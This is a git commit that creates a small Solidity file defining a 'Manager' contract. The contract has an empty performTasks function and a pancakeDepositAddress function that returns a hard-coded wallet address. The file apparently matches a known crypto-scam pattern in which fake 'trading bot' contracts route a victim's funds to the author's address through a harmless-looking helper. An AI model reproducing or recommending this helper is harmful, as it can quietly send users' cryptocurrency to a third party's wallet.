834259ec3380939ae5a63a6daa719a4c66b35aae
boli21 <gallazulhy@gmail.com>
2021-05-28 20:20:11 +0700

    Create mol.sol
    first

---
+++ mol.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x7e3EE69EceCB644557255695bC85448Fd80328CE;
+	}
+}
